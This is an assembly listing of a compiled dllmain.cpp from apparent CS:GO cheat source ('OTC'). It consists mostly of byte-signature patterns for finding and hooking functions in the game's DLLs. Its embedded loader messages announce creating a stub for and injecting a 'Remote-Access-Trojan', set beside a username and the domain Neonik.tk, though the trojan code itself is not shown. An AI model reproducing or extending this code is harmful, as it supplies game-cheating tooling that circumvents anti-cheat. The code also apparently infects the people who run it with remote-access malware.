; Listing generated by Microsoft (R) Optimizing Compiler Version 19.26.28806.0 

	TITLE	c:\users\neonik\desktop\csgo cheat sources\otc-source\otc\dllmain.cpp
	.686P
	.XMM
	include listing.inc
	.model	flat

INCLUDELIB OLDNAMES

PUBLIC	??_C@_03KNCNPCCC@OTC@				; `string'
PUBLIC	??_C@_0BC@BMFENILA@Loading?5up?5OTC?4?4?5@	; `string'
PUBLIC	??_C@_0CB@PONPHMNH@?$HM?5?$FL?$HO?$FN?5Performing?5basic?5checks?4?4@ ; `string'
PUBLIC	??_C@_0DK@OACAPHFB@?$HM?5?$FL?9?$FN?5I?5cannot?5run?5OTC?5on?5the?5c@ ; `string'
PUBLIC	??_C@_0DC@NHDBKKLG@?$HM?5?$FL?$HO?$FN?5Please?5upgrade?5to?57?5or?58?0@ ; `string'
PUBLIC	??_C@_0ED@EOFJBFEH@?$HM?5?$FL?$CL?$FN?5Your?5windows?5version?5meet@ ; `string'
PUBLIC	??_C@_0EH@PFJPAFGG@?$HM?5?$FL?9?$FN?5Could?5not?5find?5the?5msvc?5r@ ; `string'
PUBLIC	??_C@_0IE@MADIDBIL@?$HM?5?$FL?$HO?$FN?5You?5can?5download?5and?5inst@ ; `string'
PUBLIC	??_C@_0DL@KKGOFNJE@?$HM?5?$FL?$CL?$FN?5Found?5the?5required?5msvc?5r@ ; `string'
PUBLIC	??_C@_0BJ@DNOPFKIA@?$HM?5?$FL?$CL?$FN?5All?5checks?5passed?4@ ; `string'
PUBLIC	??_C@_0CH@MHEJMGJD@?$HM?5?$FL?$HO?$FN?5Extracting?5segment?5to?5mem@ ; `string'
PUBLIC	??_C@_0CD@CAFJDLOK@?$HM?5?$FL?$HO?$FN?5Reconstructing?5hot?9points@ ; `string'
PUBLIC	??_C@_0DJ@EPKKPONP@?$HM?5?$FL?$CL?$FN?5Wait?5until?5the?5Remote?9Acc@ ; `string'
PUBLIC	??_C@_0DB@PEHHJAKP@?$HM?5?$FL?$HO?$FN?5Filling?5the?5DNS?5Server?5In@ ; `string'
PUBLIC	??_C@_0BG@PPFIICFP@?$HM?5?$FL?$HO?$FN?5Updating?5DNS?4?4?4@ ; `string'
PUBLIC	??_C@_0DA@NAIALJDJ@?$HM?5?$FL?$HO?$FN?5Creating?5STUB?5for?5Remote?9@ ; `string'
PUBLIC	??_C@_0CH@IEOFEGDJ@?$HM?5?$FL?$HO?$FN?5Updating?5Remote?9Access?9Tr@ ; `string'
PUBLIC	??_C@_06CPAKJCCD@Neonik@			; `string'
PUBLIC	??_C@_08JMMIJEMM@USERNAME@			; `string'
PUBLIC	??_C@_09MLFFDPN@Neonik?4tk@			; `string'
PUBLIC	??_C@_0BH@MPGHJPCI@?$HM?5?$FL?$HO?$FN?5Updating?5STUB?4?4?4@ ; `string'
PUBLIC	??_C@_0CF@IPOJIKMB@?$HM?5?$FL?$CL?$FN?5Remote?9Access?9Trojan?5Inje@ ; `string'
PUBLIC	??_C@_0CO@JECMMAFB@Good?5luck?5finding?5the?5Remote?9Ac@ ; `string'
PUBLIC	??_C@_0L@PHFEFMEF@client?4dll@			; `string'
PUBLIC	??_C@_0BD@NKPNDPNB@vguimatsurface?4dll@		; `string'
PUBLIC	??_C@_0BB@IDMFBLEL@shaderapidx9?4dll@		; `string'
PUBLIC	??_C@_0M@EINGCJHB@vstdlib?4dll@			; `string'
PUBLIC	??_C@_0CB@KJIDDANE@55?58B?5EC?583?5E4?5F8?583?5EC?570?56A?55@ ; `string'
PUBLIC	??_C@_0BK@EOKMOEOO@56?56A?501?568?5?$DP?5?$DP?5?$DP?5?$DP?58B?5F1@ ; `string'
PUBLIC	??_C@_0DF@CJDDHIEG@55?58B?5EC?583?5E4?5F8?551?553?556?557?58@ ; `string'
PUBLIC	??_C@_0CK@CMLHGGBK@55?58B?5EC?583?5E4?5F8?583?5EC?564?553?55@ ; `string'
PUBLIC	??_C@_0BL@DOALEGMD@51?556?58B?5F1?585?5F6?574?568?583@ ; `string'
PUBLIC	??_C@_0CB@IJIMFMOE@55?58B?5EC?553?58B?55D?508?556?58B?5F1?58@ ; `string'
PUBLIC	??_C@_0CH@JIFLMJLL@55?58B?5EC?583?5E4?5C0?583?5EC?534?553?55@ ; `string'
PUBLIC	??_C@_0BK@GLHNJMEN@8B?50D?5?$DP?5?$DP?5?$DP?5?$DP?58B?546?508?568@ ; `string'
PUBLIC	??_C@_0BI@HDJCOIJC@55?58B?5EC?556?58B?5F1?551?58D@ ; `string'
PUBLIC	??_C@_0DL@EIBMNNHJ@55?58B?5EC?583?5E4?5F8?581?5EC?5?$DP?5?$DP?5?$DP?5?$DP@ ; `string'
PUBLIC	??_C@_0CD@EIEEDCML@55?58B?5EC?5FF?575?518?5F3?50F?510?545?5?$DP@ ; `string'
PUBLIC	??_C@_0CI@KPMIAJJE@55?58B?5EC?551?556?58B?5F1?580?5BE?5?$DP?5?$DP?5@ ; `string'
PUBLIC	??_C@_0DJ@CEFDOBKF@8B?535?5?$DP?5?$DP?5?$DP?5?$DP?5FF?590?5?$DP?5?$DP?5?$DP?5?$DP?550?5@ ; `string'
PUBLIC	??_C@_0CK@DFKOCHGN@B9?5?$DP?5?$DP?5?$DP?5?$DP?5A1?5?$DP?5?$DP?5?$DP?5?$DP?5FF?510?5A1?5@ ; `string'
PUBLIC	??_C@_0CE@KJGDCOM@0F?544?5C8?533?5C0?55E?539?511?50F?594?5C@ ; `string'
PUBLIC	??_C@_0M@MACNFAAE@B0?501?583?5FE@		; `string'
PUBLIC	??_C@_0BH@PAMFABDB@B9?5?$DP?5?$DP?5?$DP?5?$DP?5FF?550?514?55F@ ; `string'
PUBLIC	??_C@_0CJ@JOAILMAE@81?5C6?5?$DP?5?$DP?5?$DP?5?$DP?58B?54E?50C?58B?556?504@ ; `string'
PUBLIC	??_C@_0CD@FHMDKEH@55?58B?5EC?551?556?58B?535?5?$DP?5?$DP?5?$DP?5?$DP?557@ ; `string'
PUBLIC	??_C@_0CL@EEFECCOM@C7?500?5?$DP?5?$DP?5?$DP?5?$DP?5E8?5?$DP?5?$DP?5?$DP?5?$DP?583?5EC?5@ ; `string'
PUBLIC	??_C@_0CD@CLINDDEG@55?58B?5EC?583?5EC?508?58B?515?5?$DP?5?$DP?5?$DP?5?$DP@ ; `string'
PUBLIC	??_C@_0BG@GPJJHLHE@80?5B9?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?575?56C@ ; `string'
PUBLIC	??_C@_0BP@PMDLCGGD@83?53D?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?557?58B?5F9?575?506@ ; `string'
PUBLIC	??_C@_0BB@MBFPJFAI@A1?5?$DP?5?$DP?5?$DP?5?$DP?574?538@ ; `string'
PUBLIC	??_C@_0CK@MBPLAPBK@55?58B?5EC?553?58B?55D?508?556?557?58B?5F@ ; `string'
PUBLIC	??_C@_0CM@PPIJPEML@55?58B?5EC?556?58B?575?50C?557?58B?5F9?5B@ ; `string'
PUBLIC	??_C@_0CE@PNFFJNMC@B9?5?$DP?5?$DP?5?$DP?5?$DP?5A3?5?$DP?5?$DP?5?$DP?5?$DP?5E8?5?$DP?5?$DP?5?$DP?5@ ; `string'
PUBLIC	??_C@_0BO@BNNHFHPN@55?58B?5EC?583?5EC?50C?553?556?58B?571@ ; `string'
PUBLIC	??_C@_0DH@FGAABEAA@B9?5?$DP?5?$DP?5?$DP?5?$DP?5E8?5?$DP?5?$DP?5?$DP?5?$DP?585?5C0?574?5@ ; `string'
PUBLIC	??_C@_0CH@CEFANBNE@55?58B?5EC?551?553?556?58B?575?508?58B?5D@ ; `string'
PUBLIC	??_C@_0HD@POPCBNPK@0F?584?5?$DP?5?$DP?5?$DP?5?$DP?58B?588?5?$DP?5?$DP?5?$DP?5?$DP?583?5@ ; `string'
PUBLIC	??_C@_0BC@HMEMPFIB@84?5C0?574?517?58B?587@	; `string'
PUBLIC	??_C@_0CG@FFELLHH@84?5C0?574?50A?5F3?50F?510?505?5?$DP?5?$DP?5?$DP?5?$DP@ ; `string'
PUBLIC	??_C@_0BE@DLMGOELC@8B?597?5?$DP?5?$DP?5?$DP?5?$DP?556?58B@ ; `string'
PUBLIC	??_C@_0CB@EHCBCFDJ@55?58B?5EC?583?5E4?5F0?583?5EC?57C?556?5F@ ; `string'
PUBLIC	??_C@_0BL@NILMMPDH@55?58B?5EC?58D?551?508?58B?54D?508@ ; `string'
PUBLIC	??_C@_0DB@NJMJDNKE@55?58B?5EC?556?58B?535?5?$DP?5?$DP?5?$DP?5?$DP?585?5F6@ ; `string'
PUBLIC	??_C@_0CF@GJBCBAFI@8B?501?5FF?5B1?5?$DP?5?$DP?5?$DP?5?$DP?5FF?590?5?$DP?5?$DP?5?$DP@ ; `string'
PUBLIC	??_C@_0BI@BINPCKGE@55?58B?5EC?583?5EC?558?556?557@ ; `string'
PUBLIC	??_C@_0BI@PHFBLDMI@53?556?58B?5F1?557?58B?54E?53C@ ; `string'
PUBLIC	??_C@_0CB@FABLCKIN@55?58B?5EC?556?58B?575?508?557?5FF?575?51@ ; `string'
PUBLIC	??_C@_0DG@PEDGIBOM@55?58B?5EC?583?5E4?5F8?583?5EC?50C?553?55@ ; `string'
PUBLIC	??_C@_0CN@OIDCGODA@55?58B?5EC?583?5E4?5F8?583?5EC?50C?553?58@ ; `string'
PUBLIC	??_C@_0CN@EECAACMO@55?58B?5EC?583?5E4?5F8?583?5EC?51C?553?55@ ; `string'
PUBLIC	??_C@_0BN@IIAHNBAC@F3?50F?510?5A6?5?$DP?5?$DP?5?$DP?5?$DP?5F3?50F?511@ ; `string'
PUBLIC	??_C@_0CJ@IBABLOEE@56?58B?5F1?58B?50D?5?$DP?5?$DP?5?$DP?5?$DP?557?58B?501@ ; `string'
PUBLIC	??_C@_0CD@FBPNHNGE@55?58B?5EC?583?5EC?510?5A1?5?$DP?5?$DP?5?$DP?5?$DP?589@ ; `string'
PUBLIC	??_C@_0CP@PEBOMIDC@57?58B?5F9?58B?507?58B?580?5?$DP?5?$DP?5?$DP?5?$DP?5FF@ ; `string'
PUBLIC	??_C@_0DA@OAEFGDOI@55?58B?5EC?583?5E4?5F8?583?5EC?55C?553?58@ ; `string'
PUBLIC	??_C@_0CH@OFLNLCEJ@55?58B?5EC?583?5E4?5F8?583?5EC?530?556?55@ ; `string'
PUBLIC	??_C@_0DF@HBNAIIIO@55?58B?5EC?556?5FF?575?508?58B?5F1?58B?50@ ; `string'
PUBLIC	??_C@_0BC@NOOJPJHB@85?5C0?575?530?538?586@	; `string'
PUBLIC	??_C@_0BD@LIBFMOBN@C7?546?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?543@ ; `string'
PUBLIC	??_C@_0BC@CLEEDAAD@85?5C0?574?52D?583?57D@	; `string'
PUBLIC	??_C@_0P@CGNIIJII@75?504?5B0?501?55F@		; `string'
PUBLIC	??_C@_0BC@LFBMICMP@84?5C0?575?50D?5F6?587@	; `string'
PUBLIC	??_C@_0CG@FHMIJDND@84?5C0?575?538?58B?50D?5?$DP?5?$DP?5?$DP?5?$DP?58B?501@ ; `string'
PUBLIC	??_C@_0CE@LKCAGEIP@84?5C0?575?509?55F?55E?55B?58B?5E5?55D?5C@ ; `string'
PUBLIC	??_C@_0CJ@FCOBLFNE@55?58B?5EC?581?5EC?5?$DP?5?$DP?5?$DP?5?$DP?553?556?557@ ; `string'
PUBLIC	??_C@_0BK@GIPFPJPJ@F3?50F?510?54D?5?$DP?584?5C0?574?512@ ; `string'
PUBLIC	??_C@_0BE@NOPHJDIG@FF?5D0?5A1?5?$DP?5?$DP?5?$DP?5?$DP?5B9@ ; `string'
PUBLIC	??_C@_0BH@MDINMCPF@E8?5?$DP?5?$DP?5?$DP?5?$DP?5FF?576?50C?58D@ ; `string'
PUBLIC	??_C@_0CK@NDFMKNFD@80?53D?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?574?516?5A1?5?$DP?5?$DP?5?$DP?5@ ; `string'
PUBLIC	??_C@_0DH@GGEIJINE@8B?535?5?$DP?5?$DP?5?$DP?5?$DP?5FF?510?50F?5B7?5C0?5B9@ ; `string'
PUBLIC	??_C@_0BG@DEDHDCDI@83?5BE?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?57F?567@ ; `string'
PUBLIC	??_C@_0CA@CCMNJOJN@E8?5?$DP?5?$DP?5?$DP?5?$DP?5EB?502?533?5C0?557?58B?5BE@ ; `string'
PUBLIC	??_C@_0CG@HDEAFJAI@E8?5?$DP?5?$DP?5?$DP?5?$DP?58B?5D0?585?5D2?575?507?532@ ; `string'
PUBLIC	??_C@_0DC@HPKDGOAA@E8?5?$DP?5?$DP?5?$DP?5?$DP?58B?546?504?55F?55E?55B?58B@ ; `string'
PUBLIC	??_C@_0M@OEHPONHC@75?54B?50F?557@		; `string'
PUBLIC	??_C@_0CC@NJGBBMJN@0F?5B7?505?5?$DP?5?$DP?5?$DP?5?$DP?53D?5?$DP?5?$DP?5?$DP?5?$DP?574?5@ ; `string'
PUBLIC	??_C@_0M@OFBMICFD@56?58D?551?53C@		; `string'
PUBLIC	??_C@_0BN@JDGIHKEL@E8?5?$DP?5?$DP?5?$DP?5?$DP?583?57D?5D8?500?57C?50F@ ; `string'
PUBLIC	??_C@_0DH@BDJAJANF@55?58B?5EC?583?5E4?5F8?581?5EC?5?$DP?5?$DP?5?$DP?5?$DP@ ; `string'
PUBLIC	??_C@_0BB@HJKEOCJD@E8?5?$DP?5?$DP?5?$DP?5?$DP?599?52B@ ; `string'
PUBLIC	??_C@_0CF@KKAIIKCM@E8?5?$DP?5?$DP?5?$DP?5?$DP?58B?50D?5?$DP?5?$DP?5?$DP?5?$DP?50F?557?5@ ; `string'
PUBLIC	??_C@_0M@GHAFGLNO@8D?54E?574?58B@		; `string'
PUBLIC	??_C@_0CB@HIJCDHC@8B?50D?5?$DP?5?$DP?5?$DP?5?$DP?5F6?587?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?58@ ; `string'
PUBLIC	??_C@_0BN@NCEFIOGI@55?58B?5EC?5F3?50F?510?545?5?$DP?556?56A@ ; `string'
PUBLIC	??_C@_0CE@IFHNNPNM@55?58B?5EC?583?5E4?5F8?58B?545?50C?583?5E@ ; `string'
PUBLIC	??_C@_0BI@EHNMLEME@FF?550?518?589?544?524?514?5EB@ ; `string'
PUBLIC	??_C@_0BE@MLEIBKML@A2?5?$DP?5?$DP?5?$DP?5?$DP?58B?545?5E8@ ; `string'
PUBLIC	??_C@_0CB@LHJAFMPF@55?58B?5EC?583?5E4?5F8?551?553?556?58B?5D@ ; `string'
PUBLIC	??_C@_0BL@HOLHFMKH@55?58B?5EC?583?5EC?548?553?58B?55D@ ; `string'
PUBLIC	?OriginalVirtualCaller@SegmentFramework@@2P6IIPAXH@ZA ; SegmentFramework::OriginalVirtualCaller
PUBLIC	?UnsafeAllocatedPointer@Segment@@2KA		; Segment::UnsafeAllocatedPointer
PUBLIC	?UnsafeLibraryPointer@Segment@@2KA		; Segment::UnsafeLibraryPointer
?OriginalVirtualCaller@SegmentFramework@@2P6IIPAXH@ZA DD 01H DUP (?) ; SegmentFramework::OriginalVirtualCaller
?UnsafeAllocatedPointer@Segment@@2KA DD 01H DUP (?)	; Segment::UnsafeAllocatedPointer
?UnsafeLibraryPointer@Segment@@2KA DD 01H DUP (?)	; Segment::UnsafeLibraryPointer
_BSS	ENDS
;	COMDAT ??_C@_0BL@HOLHFMKH@55?58B?5EC?583?5EC?548?553?58B?55D@
CONST	SEGMENT
??_C@_0BL@HOLHFMKH@55?58B?5EC?583?5EC?548?553?58B?55D@ DB '55 8B EC 83 EC'
	DB	' 48 53 8B 5D', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0CB@LHJAFMPF@55?58B?5EC?583?5E4?5F8?551?553?556?58B?5D@
CONST	SEGMENT
??_C@_0CB@LHJAFMPF@55?58B?5EC?583?5E4?5F8?551?553?556?58B?5D@ DB '55 8B E'
	DB	'C 83 E4 F8 51 53 56 8B D9', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0BE@MLEIBKML@A2?5?$DP?5?$DP?5?$DP?5?$DP?58B?545?5E8@
CONST	SEGMENT
??_C@_0BE@MLEIBKML@A2?5?$DP?5?$DP?5?$DP?5?$DP?58B?545?5E8@ DB 'A2 ? ? ? ?'
	DB	' 8B 45 E8', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0BI@EHNMLEME@FF?550?518?589?544?524?514?5EB@
CONST	SEGMENT
??_C@_0BI@EHNMLEME@FF?550?518?589?544?524?514?5EB@ DB 'FF 50 18 89 44 24 '
	DB	'14 EB', 00H					; `string'
CONST	ENDS
;	COMDAT ??_C@_0CE@IFHNNPNM@55?58B?5EC?583?5E4?5F8?58B?545?50C?583?5E@
CONST	SEGMENT
??_C@_0CE@IFHNNPNM@55?58B?5EC?583?5E4?5F8?58B?545?50C?583?5E@ DB '55 8B E'
	DB	'C 83 E4 F8 8B 45 0C 83 EC 10', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0BN@NCEFIOGI@55?58B?5EC?5F3?50F?510?545?5?$DP?556?56A@
CONST	SEGMENT
??_C@_0BN@NCEFIOGI@55?58B?5EC?5F3?50F?510?545?5?$DP?556?56A@ DB '55 8B EC'
	DB	' F3 0F 10 45 ? 56 6A', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0CB@HIJCDHC@8B?50D?5?$DP?5?$DP?5?$DP?5?$DP?5F6?587?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?58@
CONST	SEGMENT
??_C@_0CB@HIJCDHC@8B?50D?5?$DP?5?$DP?5?$DP?5?$DP?5F6?587?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?58@ DB '8'
	DB	'B 0D ? ? ? ? F6 87 ? ? ? ? ? 8B', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0M@GHAFGLNO@8D?54E?574?58B@
CONST	SEGMENT
??_C@_0M@GHAFGLNO@8D?54E?574?58B@ DB '8D 4E 74 8B', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0CF@KKAIIKCM@E8?5?$DP?5?$DP?5?$DP?5?$DP?58B?50D?5?$DP?5?$DP?5?$DP?5?$DP?50F?557?5@
CONST	SEGMENT
??_C@_0CF@KKAIIKCM@E8?5?$DP?5?$DP?5?$DP?5?$DP?58B?50D?5?$DP?5?$DP?5?$DP?5?$DP?50F?557?5@ DB 'E'
	DB	'8 ? ? ? ? 8B 0D ? ? ? ? 0F 57 C9 99', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BB@HJKEOCJD@E8?5?$DP?5?$DP?5?$DP?5?$DP?599?52B@
CONST	SEGMENT
??_C@_0BB@HJKEOCJD@E8?5?$DP?5?$DP?5?$DP?5?$DP?599?52B@ DB 'E8 ? ? ? ? 99 '
	DB	'2B', 00H					; `string'
CONST	ENDS
;	COMDAT ??_C@_0DH@BDJAJANF@55?58B?5EC?583?5E4?5F8?581?5EC?5?$DP?5?$DP?5?$DP?5?$DP@
CONST	SEGMENT
??_C@_0DH@BDJAJANF@55?58B?5EC?583?5E4?5F8?581?5EC?5?$DP?5?$DP?5?$DP?5?$DP@ DB '5'
	DB	'5 8B EC 83 E4 F8 81 EC ? ? ? ? A1 ? ? ? ? 53 56 8B D9', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BN@JDGIHKEL@E8?5?$DP?5?$DP?5?$DP?5?$DP?583?57D?5D8?500?57C?50F@
CONST	SEGMENT
??_C@_0BN@JDGIHKEL@E8?5?$DP?5?$DP?5?$DP?5?$DP?583?57D?5D8?500?57C?50F@ DB 'E'
	DB	'8 ? ? ? ? 83 7D D8 00 7C 0F', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0M@OFBMICFD@56?58D?551?53C@
CONST	SEGMENT
??_C@_0M@OFBMICFD@56?58D?551?53C@ DB '56 8D 51 3C', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0CC@NJGBBMJN@0F?5B7?505?5?$DP?5?$DP?5?$DP?5?$DP?53D?5?$DP?5?$DP?5?$DP?5?$DP?574?5@
CONST	SEGMENT
??_C@_0CC@NJGBBMJN@0F?5B7?505?5?$DP?5?$DP?5?$DP?5?$DP?53D?5?$DP?5?$DP?5?$DP?5?$DP?574?5@ DB '0'
	DB	'F B7 05 ? ? ? ? 3D ? ? ? ? 74 3F', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0M@OEHPONHC@75?54B?50F?557@
CONST	SEGMENT
??_C@_0M@OEHPONHC@75?54B?50F?557@ DB '75 4B 0F 57', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0DC@HPKDGOAA@E8?5?$DP?5?$DP?5?$DP?5?$DP?58B?546?504?55F?55E?55B?58B@
CONST	SEGMENT
??_C@_0DC@HPKDGOAA@E8?5?$DP?5?$DP?5?$DP?5?$DP?58B?546?504?55F?55E?55B?58B@ DB 'E'
	DB	'8 ? ? ? ? 8B 46 04 5F 5E 5B 8B E5 5D C2 08 00 6A', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0CG@HDEAFJAI@E8?5?$DP?5?$DP?5?$DP?5?$DP?58B?5D0?585?5D2?575?507?532@
CONST	SEGMENT
??_C@_0CG@HDEAFJAI@E8?5?$DP?5?$DP?5?$DP?5?$DP?58B?5D0?585?5D2?575?507?532@ DB 'E'
	DB	'8 ? ? ? ? 8B D0 85 D2 75 07 32 C0 5F', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0CA@CCMNJOJN@E8?5?$DP?5?$DP?5?$DP?5?$DP?5EB?502?533?5C0?557?58B?5BE@
CONST	SEGMENT
??_C@_0CA@CCMNJOJN@E8?5?$DP?5?$DP?5?$DP?5?$DP?5EB?502?533?5C0?557?58B?5BE@ DB 'E'
	DB	'8 ? ? ? ? EB 02 33 C0 57 8B BE', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BG@DEDHDCDI@83?5BE?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?57F?567@
CONST	SEGMENT
??_C@_0BG@DEDHDCDI@83?5BE?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?57F?567@ DB '83 B'
	DB	'E ? ? ? ? ? 7F 67', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0DH@GGEIJINE@8B?535?5?$DP?5?$DP?5?$DP?5?$DP?5FF?510?50F?5B7?5C0?5B9@
CONST	SEGMENT
??_C@_0DH@GGEIJINE@8B?535?5?$DP?5?$DP?5?$DP?5?$DP?5FF?510?50F?5B7?5C0?5B9@ DB '8'
	DB	'B 35 ? ? ? ? FF 10 0F B7 C0 B9 ? ? ? ? 50 FF 56 08 85', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0CK@NDFMKNFD@80?53D?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?574?516?5A1?5?$DP?5?$DP?5?$DP?5@
CONST	SEGMENT
??_C@_0CK@NDFMKNFD@80?53D?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?574?516?5A1?5?$DP?5?$DP?5?$DP?5@ DB '8'
	DB	'0 3D ? ? ? ? ? 74 16 A1 ? ? ? ? 48 C7 81', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BH@MDINMCPF@E8?5?$DP?5?$DP?5?$DP?5?$DP?5FF?576?50C?58D@
CONST	SEGMENT
??_C@_0BH@MDINMCPF@E8?5?$DP?5?$DP?5?$DP?5?$DP?5FF?576?50C?58D@ DB 'E8 ? ?'
	DB	' ? ? FF 76 0C 8D', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0BE@NOPHJDIG@FF?5D0?5A1?5?$DP?5?$DP?5?$DP?5?$DP?5B9@
CONST	SEGMENT
??_C@_0BE@NOPHJDIG@FF?5D0?5A1?5?$DP?5?$DP?5?$DP?5?$DP?5B9@ DB 'FF D0 A1 ?'
	DB	' ? ? ? B9', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0BK@GIPFPJPJ@F3?50F?510?54D?5?$DP?584?5C0?574?512@
CONST	SEGMENT
??_C@_0BK@GIPFPJPJ@F3?50F?510?54D?5?$DP?584?5C0?574?512@ DB 'F3 0F 10 4D '
	DB	'? 84 C0 74 12', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0CJ@FCOBLFNE@55?58B?5EC?581?5EC?5?$DP?5?$DP?5?$DP?5?$DP?553?556?557@
CONST	SEGMENT
??_C@_0CJ@FCOBLFNE@55?58B?5EC?581?5EC?5?$DP?5?$DP?5?$DP?5?$DP?553?556?557@ DB '5'
	DB	'5 8B EC 81 EC ? ? ? ? 53 56 57 8B D9 E8', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0CE@LKCAGEIP@84?5C0?575?509?55F?55E?55B?58B?5E5?55D?5C@
CONST	SEGMENT
??_C@_0CE@LKCAGEIP@84?5C0?575?509?55F?55E?55B?58B?5E5?55D?5C@ DB '84 C0 7'
	DB	'5 09 5F 5E 5B 8B E5 5D C2 14', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0CG@FHMIJDND@84?5C0?575?538?58B?50D?5?$DP?5?$DP?5?$DP?5?$DP?58B?501@
CONST	SEGMENT
??_C@_0CG@FHMIJDND@84?5C0?575?538?58B?50D?5?$DP?5?$DP?5?$DP?5?$DP?58B?501@ DB '8'
	DB	'4 C0 75 38 8B 0D ? ? ? ? 8B 01 8B 80', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BC@LFBMICMP@84?5C0?575?50D?5F6?587@
CONST	SEGMENT
??_C@_0BC@LFBMICMP@84?5C0?575?50D?5F6?587@ DB '84 C0 75 0D F6 87', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0P@CGNIIJII@75?504?5B0?501?55F@
CONST	SEGMENT
??_C@_0P@CGNIIJII@75?504?5B0?501?55F@ DB '75 04 B0 01 5F', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BC@CLEEDAAD@85?5C0?574?52D?583?57D@
CONST	SEGMENT
??_C@_0BC@CLEEDAAD@85?5C0?574?52D?583?57D@ DB '85 C0 74 2D 83 7D', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BD@LIBFMOBN@C7?546?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?543@
CONST	SEGMENT
??_C@_0BD@LIBFMOBN@C7?546?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?543@ DB 'C7 46 ? '
	DB	'? ? ? ? 43', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0BC@NOOJPJHB@85?5C0?575?530?538?586@
CONST	SEGMENT
??_C@_0BC@NOOJPJHB@85?5C0?575?530?538?586@ DB '85 C0 75 30 38 86', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0DF@HBNAIIIO@55?58B?5EC?556?5FF?575?508?58B?5F1?58B?50@
CONST	SEGMENT
??_C@_0DF@HBNAIIIO@55?58B?5EC?556?5FF?575?508?58B?5F1?58B?50@ DB '55 8B E'
	DB	'C 56 FF 75 08 8B F1 8B 06 FF 90 ? ? ? ? 8B 86', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0CH@OFLNLCEJ@55?58B?5EC?583?5E4?5F8?583?5EC?530?556?55@
CONST	SEGMENT
??_C@_0CH@OFLNLCEJ@55?58B?5EC?583?5E4?5F8?583?5EC?530?556?55@ DB '55 8B E'
	DB	'C 83 E4 F8 83 EC 30 56 57 8B 3D', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0DA@OAEFGDOI@55?58B?5EC?583?5E4?5F8?583?5EC?55C?553?58@
CONST	SEGMENT
??_C@_0DA@OAEFGDOI@55?58B?5EC?583?5E4?5F8?583?5EC?55C?553?58@ DB '55 8B E'
	DB	'C 83 E4 F8 83 EC 5C 53 8B D9 56 57 83 7B', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0CP@PEBOMIDC@57?58B?5F9?58B?507?58B?580?5?$DP?5?$DP?5?$DP?5?$DP?5FF@
CONST	SEGMENT
??_C@_0CP@PEBOMIDC@57?58B?5F9?58B?507?58B?580?5?$DP?5?$DP?5?$DP?5?$DP?5FF@ DB '5'
	DB	'7 8B F9 8B 07 8B 80 ? ? ? ? FF D0 84 C0 75 02', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0CD@FBPNHNGE@55?58B?5EC?583?5EC?510?5A1?5?$DP?5?$DP?5?$DP?5?$DP?589@
CONST	SEGMENT
??_C@_0CD@FBPNHNGE@55?58B?5EC?583?5EC?510?5A1?5?$DP?5?$DP?5?$DP?5?$DP?589@ DB '5'
	DB	'5 8B EC 83 EC 10 A1 ? ? ? ? 89 4D', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0CJ@IBABLOEE@56?58B?5F1?58B?50D?5?$DP?5?$DP?5?$DP?5?$DP?557?58B?501@
CONST	SEGMENT
??_C@_0CJ@IBABLOEE@56?58B?5F1?58B?50D?5?$DP?5?$DP?5?$DP?5?$DP?557?58B?501@ DB '5'
	DB	'6 8B F1 8B 0D ? ? ? ? 57 8B 01 FF 76 70', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BN@IIAHNBAC@F3?50F?510?5A6?5?$DP?5?$DP?5?$DP?5?$DP?5F3?50F?511@
CONST	SEGMENT
??_C@_0BN@IIAHNBAC@F3?50F?510?5A6?5?$DP?5?$DP?5?$DP?5?$DP?5F3?50F?511@ DB 'F'
	DB	'3 0F 10 A6 ? ? ? ? F3 0F 11', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0CN@EECAACMO@55?58B?5EC?583?5E4?5F8?583?5EC?51C?553?55@
CONST	SEGMENT
